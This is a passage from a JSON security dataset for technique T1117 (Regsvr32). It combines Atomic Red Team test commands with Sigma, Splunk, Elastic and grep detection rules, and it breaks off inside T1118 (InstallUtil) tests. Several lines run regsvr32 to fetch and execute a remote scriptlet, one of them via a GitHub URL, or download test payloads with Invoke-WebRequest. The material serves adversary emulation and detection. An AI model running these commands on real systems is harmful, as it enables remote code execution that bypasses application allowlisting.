(C:\\Windows\\syswow64\\regsvr32.exe /s PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll) ELSE ( regsvr32.exe /s PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll )\"\n", "name": null}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "odbcconf.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "reg32svr.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe /i (http:|ftp:)", "name": null}, {"source": "Threat Hunting Tables", "command": "scrobj.dll", "name": "loaded_dll"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe", "name": "sub_process_1"}, {"source": "SysmonHunter - Regsvr32", "command": "/s|/i\\\\Windows\\\\.+\\\\regsvr32.exe", "name": null}], "command_list": ["regsvr32.exe /s /u /i:PathToAtomicsFolder\\T1117\\src\\RegSvr32.sct scrobj.dll\n", "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct scrobj.dll\n", "\"IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll) ELSE ( regsvr32.exe /s PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll )\"\n", "excel.exe", "regsvr32.exe", "mshta.exe", "regsvr32.exe", "odbcconf.exe", "regsvr32.exe", "powerpoint.exe", "regsvr32.exe", "reg32svr.exe", "regsvr32.exe /i (http:|ftp:)", "scrobj.dll", "winword.exe", "regsvr32.exe", "/s|/i\\\\Windows\\\\.+\\\\regsvr32.exe"], "technique_id": "T1117", "parsed_datasets": [{"Atomic Red Team Test - Regsvr32": {"display_name": "Regsvr32", "atomic_tests": [{"dependencies": [{"description": "Regsvr32.exe must exist on disk at specified location (#{filename})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/src/RegSvr32.sct\" -OutFile \"#{filename}\"\n", "prereq_command": "if (Test-Path #{filename}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Regsvr32 local COM scriptlet execution", "executor": {"elevation_required": false, "command": "regsvr32.exe /s /u /i:#{filename} scrobj.dll\n", "name": "command_prompt"}, "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls\n", "input_arguments": {"filename": {"default": "PathToAtomicsFolder\\T1117\\src\\RegSvr32.sct", "type": "Path", "description": "Name of the local file, include path."}}, "dependency_executor_name": "powershell"}, {"description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls\n", "supported_platforms": ["windows"], "name": "Regsvr32 remote COM scriptlet execution", "input_arguments": {"url": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct", "type": "Url", "description": "URL to hosted sct file"}}, "executor": {"elevation_required": false, "command": "regsvr32.exe /s /u /i:#{url} scrobj.dll\n", "name": "command_prompt"}}, {"dependencies": [{"description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\"\n", "prereq_command": "if (Test-Path #{dll_name}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Regsvr32 local DLL execution", "executor": {"elevation_required": false, "command": "\"IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )\"\n", "name": "command_prompt"}, "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls\n", "input_arguments": {"dll_name": {"default": "PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll", "type": "Path", "description": "Name of DLL to Execute, DLL Should export DllRegisterServer"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1117"}}, {"Threat Hunting Tables": {"mitre_attack": "T1117", "file_value": "", "file_path": "", "parent_process": "excel.exe", "itw_sample": "", "chain_id": "100032", "registry_value": "", "mitre_caption": "regsvr32", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "regsvr32.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1117", "file_value": "", "file_path": "", "parent_process": "mshta.exe", "itw_sample": "", "chain_id": "100046", "registry_value": "", "mitre_caption": "regsvr32", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "regsvr32.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1117", "file_value": "", "file_path": "", "parent_process": "odbcconf.exe", "itw_sample": "ccb1fa5cdbc402b912b01a1838c1f13e95e9392b3ab6cc5f28277c012b0759f9", "chain_id": "100055", "registry_value": "", "mitre_caption": "regsvr32", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "regsvr32.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1117", "file_value": "", "file_path": "", "parent_process": "powerpoint.exe", "itw_sample": "", "chain_id": "100063", "registry_value": "", "mitre_caption": "regsvr32", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "regsvr32.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1117", "file_value": "", "file_path": "", "parent_process": "reg32svr.exe", "itw_sample": "", "chain_id": "100069", "registry_value": "", "mitre_caption": "", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1117", "file_value": "", "file_path": "", "parent_process": "regsvr32.exe", "itw_sample": "", "chain_id": "100070", "registry_value": "", "mitre_caption": "reg32svr", "registry_path": "", "frequency": "rare", "commandline_string": "/i (http:|ftp:)", "loaded_dll": "scrobj.dll", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1117", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "", "chain_id": "100095", "registry_value": "", "mitre_caption": "regsvr32", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "regsvr32.exe", "sub_process_2": ""}}, {"SysmonHunter - T1117": {"phase": "Execution", "query": [{"process": {"cmdline": {"pattern": "/s|/i", "op": "and"}, "image": {"pattern": "\\\\Windows\\\\.+\\\\regsvr32.exe", "flag": "regex"}}, "type": "process"}], "description": null, "name": "Regsvr32", "level": "medium"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"regsvr32.exe\"or process_path contains \"rundll32.exe\"or process_path contains \"certutil.exe\")or process_command_line contains \"scrobj.dll\"", "product": "Azure Sentinel", "name": "Bypassing Application Whitelisting With Regsvr32"}, {"query": "Sysmon| where EventID == 3 and (process_parent_path contains \"\\\\regsvr32.exe\"or process_path contains \"\\\\regsvr32.exe\")", "product": "Azure Sentinel", "name": "Regsvr32 Network"}, {"query": "title: Regsvr32 network activity\nid: c7e91a02-d771-4a6d-a700-42587e0b1095\ndescription: Detects network connections and DNS queries initiated by Regsvr32.exe\nreferences:\n    - https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/\n    - https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1117\nauthor: Dmitriy Lifanov, oscd.community\nstatus: experimental\ndate: 2019/10/25\nmodified: 2019/11/10\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID:\n         - 3\n         - 22\n        Image|endswith: '\\regsvr32.exe'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Regsvr32 network activity\nid: c7e91a02-d771-4a6d-a700-42587e0b1095\ndescription: Detects network connections and DNS queries initiated by Regsvr32.exe\nreferences:\n    - https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/\n    - https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1117\nauthor: Dmitriy Lifanov, oscd.community\nstatus: experimental\ndate: 2019/10/25\nmodified: 2019/11/10\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID:\n         - 3\n         - 22\n        Image|endswith: '\\regsvr32.exe'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"3\" OR \"22\") AND Image.keyword:*\\\\\\\\regsvr32.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Regsvr32-network-activity <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Regsvr32 network activity\",\\n    \"description\": \"Detects network connections and DNS queries initiated by Regsvr32.exe\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1117\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"3\\\\\" OR \\\\\"22\\\\\") AND Image.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"3\\\\\" OR \\\\\"22\\\\\") AND Image.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Regsvr32 network activity\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"3\" \"22\") AND Image.keyword:*\\\\\\\\regsvr32.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"3\" OR EventID=\"22\") Image=\"*\\\\\\\\regsvr32.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id IN [\"3\", \"22\"] Image=\"*\\\\\\\\regsvr32.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*3|.*22))(?=.*.*\\\\regsvr32\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: BlueMashroom DLL Load\nid: bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0\nstatus: experimental\ndescription: Detects a suspicious DLL loading from AppData Local path as described in BlueMashroom report\nreferences:\n    - https://www.virusbulletin.com/conference/vb2019/abstracts/apt-cases-exploiting-vulnerabilities-region-specific-software\ntags:\n    - attack.defense_evasion\n    - attack.t1117\nauthor: Florian Roth\ndate: 2019/10/02\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: \n            - '*\\regsvr32*\\AppData\\Local\\\\*'\n            - '*\\AppData\\Local\\\\*,DllEntry*'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: BlueMashroom DLL Load\nid: bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0\nstatus: experimental\ndescription: Detects a suspicious DLL loading from AppData Local path as described in BlueMashroom report\nreferences:\n    - https://www.virusbulletin.com/conference/vb2019/abstracts/apt-cases-exploiting-vulnerabilities-region-specific-software\ntags:\n    - attack.defense_evasion\n    - attack.t1117\nauthor: Florian Roth\ndate: 2019/10/02\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: \n            - '*\\regsvr32*\\AppData\\Local\\\\*'\n            - '*\\AppData\\Local\\\\*,DllEntry*'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\\\\\regsvr32*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\* OR *\\\\\\\\AppData\\\\\\\\Local\\\\\\\\*,DllEntry*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/BlueMashroom-DLL-Load <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"BlueMashroom DLL Load\",\\n    \"description\": \"Detects a suspicious DLL loading from AppData Local path as described in BlueMashroom report\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1117\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\regsvr32*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\*,DllEntry*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\regsvr32*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\*,DllEntry*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'BlueMashroom DLL Load\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*\\\\\\\\regsvr32*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\* *\\\\\\\\AppData\\\\\\\\Local\\\\\\\\*,DllEntry*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\regsvr32*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\*\" OR CommandLine=\"*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\*,DllEntry*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*\\\\\\\\regsvr32*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\*\", \"*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\*,DllEntry*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\regsvr32.*\\\\AppData\\\\Local\\\\\\\\.*|.*.*\\\\AppData\\\\Local\\\\\\\\.*,DllEntry.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Regsvr32 Anomaly\nid: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\nstatus: experimental\ndescription: Detects various anomalies in relation to regsvr32.exe\nauthor: Florian Roth\nreferences:\n    - https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html\ntags:\n    - attack.t1117\n    - attack.defense_evasion\n    - attack.execution\n    - car.2019-04-002\n    - car.2019-04-003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image: '*\\regsvr32.exe'\n        CommandLine: '*\\Temp\\\\*'\n    selection2:\n        Image: '*\\regsvr32.exe'\n        ParentImage: '*\\powershell.exe'\n    selection3:\n        Image: '*\\regsvr32.exe'\n        ParentImage: '*\\cmd.exe'\n    selection4:\n        Image: '*\\regsvr32.exe'\n        CommandLine:\n            - '*/i:http* scrobj.dll'\n            - '*/i:ftp* scrobj.dll'\n    selection5:\n        Image: '*\\wscript.exe'\n        ParentImage: '*\\regsvr32.exe'\n    selection6:\n        Image: '*\\EXCEL.EXE'\n        CommandLine: '*..\\..\\..\\Windows\\System32\\regsvr32.exe *'\n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Regsvr32 Anomaly\nid: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\nstatus: experimental\ndescription: Detects various anomalies in relation to regsvr32.exe\nauthor: Florian Roth\nreferences:\n    - https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html\ntags:\n    - attack.t1117\n    - attack.defense_evasion\n    - attack.execution\n    - car.2019-04-002\n    - car.2019-04-003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image: '*\\regsvr32.exe'\n        CommandLine: '*\\Temp\\\\*'\n    selection2:\n        Image: '*\\regsvr32.exe'\n        ParentImage: '*\\powershell.exe'\n    selection3:\n        Image: '*\\regsvr32.exe'\n        ParentImage: '*\\cmd.exe'\n    selection4:\n        Image: '*\\regsvr32.exe'\n        CommandLine:\n            - '*/i:http* scrobj.dll'\n            - '*/i:ftp* scrobj.dll'\n    selection5:\n        Image: '*\\wscript.exe'\n        ParentImage: '*\\regsvr32.exe'\n    selection6:\n        Image: '*\\EXCEL.EXE'\n        CommandLine: '*..\\..\\..\\Windows\\System32\\regsvr32.exe *'\n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\regsvr32.exe AND CommandLine.keyword:*\\\\\\\\Temp\\\\\\\\*) OR (Image.keyword:*\\\\\\\\regsvr32.exe AND ParentImage.keyword:*\\\\\\\\powershell.exe) OR (Image.keyword:*\\\\\\\\regsvr32.exe AND ParentImage.keyword:*\\\\\\\\cmd.exe) OR (Image.keyword:*\\\\\\\\regsvr32.exe AND CommandLine.keyword:(*\\\\/i\\\\:http*\\\\ scrobj.dll OR *\\\\/i\\\\:ftp*\\\\ scrobj.dll)) OR (Image.keyword:*\\\\\\\\wscript.exe AND ParentImage.keyword:*\\\\\\\\regsvr32.exe) OR (Image.keyword:*\\\\\\\\EXCEL.EXE AND CommandLine.keyword:*..\\\\\\\\..\\\\\\\\..\\\\\\\\Windows\\\\\\\\System32\\\\\\\\regsvr32.exe\\\\ *))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Regsvr32-Anomaly <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Regsvr32 Anomaly\",\\n    \"description\": \"Detects various anomalies in relation to regsvr32.exe\",\\n    \"tags\": [\\n      \"attack.t1117\",\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"car.2019-04-002\",\\n      \"car.2019-04-003\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe AND CommandLine.keyword:*\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*) OR (Image.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe AND ParentImage.keyword:*\\\\\\\\\\\\\\\\powershell.exe) OR (Image.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe AND ParentImage.keyword:*\\\\\\\\\\\\\\\\cmd.exe) OR (Image.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe AND CommandLine.keyword:(*\\\\\\\\/i\\\\\\\\:http*\\\\\\\\ scrobj.dll OR *\\\\\\\\/i\\\\\\\\:ftp*\\\\\\\\ scrobj.dll)) OR (Image.keyword:*\\\\\\\\\\\\\\\\wscript.exe AND ParentImage.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe) OR (Image.keyword:*\\\\\\\\\\\\\\\\EXCEL.EXE AND CommandLine.keyword:*..\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\regsvr32.exe\\\\\\\\ *))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe AND CommandLine.keyword:*\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*) OR (Image.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe AND ParentImage.keyword:*\\\\\\\\\\\\\\\\powershell.exe) OR (Image.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe AND ParentImage.keyword:*\\\\\\\\\\\\\\\\cmd.exe) OR (Image.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe AND CommandLine.keyword:(*\\\\\\\\/i\\\\\\\\:http*\\\\\\\\ scrobj.dll OR *\\\\\\\\/i\\\\\\\\:ftp*\\\\\\\\ scrobj.dll)) OR (Image.keyword:*\\\\\\\\\\\\\\\\wscript.exe AND ParentImage.keyword:*\\\\\\\\\\\\\\\\regsvr32.exe) OR (Image.keyword:*\\\\\\\\\\\\\\\\EXCEL.EXE AND CommandLine.keyword:*..\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\regsvr32.exe\\\\\\\\ *))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Regsvr32 Anomaly\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\regsvr32.exe AND CommandLine.keyword:*\\\\\\\\Temp\\\\\\\\*) OR (Image.keyword:*\\\\\\\\regsvr32.exe AND ParentImage.keyword:*\\\\\\\\powershell.exe) OR (Image.keyword:*\\\\\\\\regsvr32.exe AND ParentImage.keyword:*\\\\\\\\cmd.exe) OR (Image.keyword:*\\\\\\\\regsvr32.exe AND CommandLine.keyword:(*\\\\/i\\\\:http* scrobj.dll *\\\\/i\\\\:ftp* scrobj.dll)) OR (Image.keyword:*\\\\\\\\wscript.exe AND ParentImage.keyword:*\\\\\\\\regsvr32.exe) OR (Image.keyword:*\\\\\\\\EXCEL.EXE AND CommandLine.keyword:*..\\\\\\\\..\\\\\\\\..\\\\\\\\Windows\\\\\\\\System32\\\\\\\\regsvr32.exe *))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\regsvr32.exe\" CommandLine=\"*\\\\\\\\Temp\\\\\\\\*\") OR (Image=\"*\\\\\\\\regsvr32.exe\" ParentImage=\"*\\\\\\\\powershell.exe\") OR (Image=\"*\\\\\\\\regsvr32.exe\" ParentImage=\"*\\\\\\\\cmd.exe\") OR (Image=\"*\\\\\\\\regsvr32.exe\" (CommandLine=\"*/i:http* scrobj.dll\" OR CommandLine=\"*/i:ftp* scrobj.dll\")) OR (Image=\"*\\\\\\\\wscript.exe\" ParentImage=\"*\\\\\\\\regsvr32.exe\") OR (Image=\"*\\\\\\\\EXCEL.EXE\" CommandLine=\"*..\\\\\\\\..\\\\\\\\..\\\\\\\\Windows\\\\\\\\System32\\\\\\\\regsvr32.exe *\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image=\"*\\\\\\\\regsvr32.exe\" CommandLine=\"*\\\\\\\\Temp\\\\\\\\*\") OR (Image=\"*\\\\\\\\regsvr32.exe\" ParentImage=\"*\\\\\\\\powershell.exe\") OR (Image=\"*\\\\\\\\regsvr32.exe\" ParentImage=\"*\\\\\\\\cmd.exe\") OR (Image=\"*\\\\\\\\regsvr32.exe\" CommandLine IN [\"*/i:http* scrobj.dll\", \"*/i:ftp* scrobj.dll\"]) OR (Image=\"*\\\\\\\\wscript.exe\" ParentImage=\"*\\\\\\\\regsvr32.exe\") OR (Image=\"*\\\\\\\\EXCEL.EXE\" CommandLine=\"*..\\\\\\\\..\\\\\\\\..\\\\\\\\Windows\\\\\\\\System32\\\\\\\\regsvr32.exe *\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*.*\\\\regsvr32\\\\.exe)(?=.*.*\\\\Temp\\\\\\\\.*))|.*(?:.*(?=.*.*\\\\regsvr32\\\\.exe)(?=.*.*\\\\powershell\\\\.exe))|.*(?:.*(?=.*.*\\\\regsvr32\\\\.exe)(?=.*.*\\\\cmd\\\\.exe))|.*(?:.*(?=.*.*\\\\regsvr32\\\\.exe)(?=.*(?:.*.*/i:http.* scrobj\\\\.dll|.*.*/i:ftp.* scrobj\\\\.dll)))|.*(?:.*(?=.*.*\\\\wscript\\\\.exe)(?=.*.*\\\\regsvr32\\\\.exe))|.*(?:.*(?=.*.*\\\\EXCEL\\\\.EXE)(?=.*.*\\\\.\\\\.\\\\\\\\.\\\\.\\\\\\\\.\\\\.\\\\Windows\\\\System32\\\\regsvr32\\\\.exe .*))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1118/T1118.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{output_file}  PathToAtomicsFolder\\T1118\\src\\T1118.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{output_file}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:%tmp%\\T1118.dll  PathToAtomicsFolder\\T1118\\src\\T1118.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false 